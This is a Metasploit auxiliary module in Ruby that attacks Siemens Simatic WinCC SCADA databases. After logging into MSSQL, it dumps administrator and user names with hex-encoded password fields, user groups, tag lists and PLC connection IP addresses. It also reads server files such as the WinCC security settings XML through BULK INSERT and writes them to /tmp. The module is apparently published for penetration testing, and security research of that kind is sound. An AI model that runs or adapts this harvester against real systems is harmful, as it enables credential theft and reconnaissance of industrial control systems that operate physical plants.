## encoding: UTF-8
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})
		super(update_info(info,
			'Name'	=> 'Simatic WinCC info harvester',
			'Description'	=> %q{
				This module receives sensitive information from the WinCC database.
			},
			'Author'	=> 
				[
					'Dmitry Nagibin', # research
					'Gleb Gritsai <ggritsai@ptsecurity.ru>', # research
					'Vyacheslav Egoshin <vegoshin@ptsecurity.ru>', # metasploit module
				],
			'License'	=>  MSF_LICENSE,
			'References'	=>
				[
					[ 'URL', 'http://www.ptsecurity.com' ]
				],
			'Version'	=> '$Revision$',
			'DisclosureDate'=> 'Jun 3 2012'
			))
		register_options(
			[
				OptString.new('DOCUMENTS_FOLDER_NAME', [true, "Documents folder name", 'Documents']),
			], self.class
		)
	end
	
	def run
		if mssql_login_datastore # connect
			
			project_databases_names = q("SELECT name FROM master..sysdatabases WHERE name LIKE 'CC%_[0-9]'") # get db
			
			get_info project_databases_names

		else
			print_error "Can't connect to the database"
		end
	end

	def q query, show_errors = true, verbose = false, only_rows = true
		result = mssql_query(query, verbose)
		if !result[:errors].empty? and show_errors
			print_error "Error: #{result[:errors]}"
			print_error "Error query: #{query}"
		else
			only_rows ? result[:rows] : result
		end
	end
	
	def get_info dbs
		prj ={}
		dbs.map do |db|
			
			db = db.first # get db name
			
			prj[db] = {} # init hash
			prj[db]["name"]		= q("SELECT DSN FROM #{db}.dbo.CC_CsSysInfoLog")
			prj[db]["admins"]	= q("SELECT NAME, convert(varbinary, PASS) as PWD from #{db}.dbo.PW_USER WHERE PASS <> '' and GRPID = 1000")
			prj[db]["users"] 	= q("SELECT ID, NAME, convert(varbinary, PASS), GRPID FROM #{db}.[dbo].[PW_USER] WHERE PASS <> '' and GRPID <> 1000")
			prj[db]["groups"]	= q("SELECT ID, NAME FROM #{db}.[dbo].[PW_USER] WHERE PASS = ''")
			prj[db]["plcs"]		= q("SELECT CONNECTIONNAME, PARAMETER FROM #{db}.[dbo].[MCPTCONNECTION]")
			prj[db]["tags"]		= q("SELECT VARNAME,VARTYP,COMMENTS FROM #{db}.[dbo].[PDE#TAGs]")

			prj[db]["plcs"] = prj[db]["plcs"].map do |name, ip| # get plc IP
				real_ip = ip # set current value
				real_ip = ip.scan(/\d+\.\d+\.\d+\.\d+/).first if ip =~ /\d+\.\d+\.\d+\.\d+/ # if ip notation found
				[name, real_ip]
			end

			print_good "Project: #{prj[db]["name"].first.first}\n" # print project name
			
			#Table data
			print_table %w|ID NAME|				, prj[db]["groups"], 	"WinCC groups"
			print_table %w|Name Password(hex)|		, prj[db]["admins"], 	"WinCC administrator"
			print_table %w|ID NAME Password(hex) GRPID|	, prj[db]["users"], 	"WinCC users"
			print_table %w|VARNAME VARTYP COMMENTS|		, prj[db]["tags"], 	"WinCC tags"
			print_table %w|CONNECTIONNAME PARAMETER|	, prj[db]["plcs"], 	"WinCC PLCs"

			#check file access through batched queries
			if can_read_file? db
				settings = read_file get_value("Security settings path"), db
				
				if settings # save results to file
					File.open("/tmp/security_settings.xml", "w+") do |f|
					f.puts settings
					end
				end	

			end
			print_line
		end
	end

	def print_table columns, rows, header = ''
		tbl = Rex::Ui::Text::Table.new(
						'Indent' 	=> 4,
						'Header' 	=> header,
						'Columns' 	=> columns
		)
		unless rows.nil?
			rows.each do |r|
				tbl << r # add rows
			end 

			print_line tbl.to_s
		end
	end

	#read file through batched queries
	def read_file file_name, db
		q("CREATE TABLE mydata (line varchar(8000));", false)
		q("BULK INSERT mydata FROM '#{file_name}';", false)
		result = q("select * from mydata", false)
		q("DROP TABLE mydata;", false)
		print_error("Can't read file: #{file_name}") if result.nil?
		result
	end

	#check account read file
	def can_read_file? db
		res = read_file get_value("test"), db
		print_status "Access read files! (#{get_value "test"} read)" unless res.nil?
		res.size > 0 # return true or false
	end

	def get_value i
		config = {
			"Security settings path" => %q|C:\Documents and Settings\All Users\Documents\SimaticSecurityControl\setRules.xml|,
			"test"			 => %q|C:\Windows\win.ini|
		}
		config[i]
	end

end
			
